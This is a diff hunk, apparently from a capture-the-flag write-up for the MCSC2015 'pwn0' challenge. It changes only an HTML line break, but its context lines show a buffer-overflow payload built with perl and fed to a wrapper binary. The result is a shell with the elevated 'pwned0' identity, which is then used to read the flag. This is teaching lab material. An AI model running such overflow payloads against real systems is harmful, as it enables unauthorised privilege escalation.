@@ -82,7 +82,7 @@ pwn0@MCSC2015:/challenges/pwn0$ perl -e 'print "A"x64 . "\x6a\x34\x01\x00"' > /t
 pwn0@MCSC2015:/challenges/pwn0$ cat /tmp/testing/input -|/tmp/testing/wrapper <br>
 Good Boy<br>
 You Win<br>
-id
+id<br>
 uid=1001(pwn0) gid=1001(pwn0) euid=1002(pwned0) egid=1002(pwned0) groups=1002(pwned0),1001(pwn0)<br>
 cat FLAG<br>
 flaG{I_4M_Th3_EaSy_One_Pwn_th3_N3xt_L3vel_If_U_C4N}<br>
